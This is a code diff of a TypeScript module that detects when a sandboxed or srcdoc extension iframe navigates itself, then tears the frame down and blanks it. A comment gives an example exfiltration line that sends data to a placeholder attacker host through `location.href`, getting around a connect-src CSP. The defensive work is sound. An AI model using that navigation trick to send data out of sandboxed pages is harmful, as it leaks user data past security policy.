@@ -1,8 +1,9 @@
-// Per-iframe-element state for `ExtensionHost`'s sandbox-page transport (the MV3
-// extension dashboard). Split out of `ExtensionHost.tsx` so the navigation and
+// Per-iframe-element state for every `ExtensionHost` transport: the srcdoc frame
+// (desktop, island, web, MCP App widgets) and the sandbox page (the MV3 extension
+// dashboard). Split out of `ExtensionHost.tsx` so the navigation and
 // document-handoff decisions are testable without a DOM.
 //
-// WHY: the sandbox page's `connect-src 'none'` CSP blocks fetch/XHR/WebSocket,
+// WHY: the companion document's `connect-src 'none'` CSP blocks fetch/XHR/WebSocket,
 // but CSP fetch directives do not govern NAVIGATION. A companion can run
 // `location.href = "https://attacker/?d=…"`, which leaks that one URL, and the
 // attacker document then lives in the same iframe, so `event.source ===
@@ -26,6 +27,11 @@ import {
  *  of the companion document fires. Anything after these is a navigation. */
 export const SANDBOX_PAGE_EXPECTED_LOADS = 2;
 
+/** A srcdoc frame loads its companion document exactly once; a changed document
+ *  remounts the element (ExtensionHost keys it), so a second load on the same
+ *  element is the companion navigating itself. */
+export const SRCDOC_EXPECTED_LOADS = 1;
+
 export interface SandboxFrameState {
 	/** Whether the companion document (with its nonce) was already sent. */
 	documentSent: boolean;
@@ -42,11 +48,15 @@ export interface SandboxFrameState {
 const frames = new WeakMap<EventTarget, SandboxFrameState>();
 
 /**
- * The state for one sandbox-page iframe element, created (with its persistent
+ * The state for one companion iframe element, created (with its persistent
  * `load` listener) the first time the host bridges that element. Call it before
- * the element can load, i.e. from the commit that inserted it.
+ * the element can load, i.e. from the commit that inserted it. `expectedLoads` is
+ * how many loads the transport itself causes before the companion runs.
  */
-export function sandboxFrameState(frame: EventTarget): SandboxFrameState {
+export function sandboxFrameState(
+	frame: EventTarget,
+	expectedLoads: number = SANDBOX_PAGE_EXPECTED_LOADS
+): SandboxFrameState {
 	const existing = frames.get(frame);
 	if (existing) {
 		return existing;
@@ -60,7 +70,7 @@ export function sandboxFrameState(frame: EventTarget): SandboxFrameState {
 	};
 	frame.addEventListener("load", () => {
 		state.loads += 1;
-		if (state.navigated || state.loads <= SANDBOX_PAGE_EXPECTED_LOADS) {
+		if (state.navigated || state.loads <= expectedLoads) {
 			return;
 		}
 		state.navigated = true;
@@ -74,19 +84,17 @@ export function sandboxFrameState(frame: EventTarget): SandboxFrameState {
 
 /**
  * Route a detected self-navigation to this effect run's `teardown`, then evict
- * the navigated document so it stops running in the dashboard. Returns the
- * disarm for the effect cleanup. A no-op for the srcdoc transport (`null`).
+ * the navigated document so it stops running in the host. Returns the disarm for
+ * the effect cleanup. `srcdoc` wins over `src`, so a srcdoc frame drops it first.
  */
 export function armNavigationTeardown(
-	state: SandboxFrameState | null,
+	state: SandboxFrameState,
 	frame: Element,
 	teardown: () => void
 ): () => void {
-	if (!state) {
-		return () => undefined;
-	}
 	state.onNavigated = () => {
 		teardown();
+		frame.removeAttribute("srcdoc");
 		frame.setAttribute("src", "about:blank");
 	};
 	return () => {
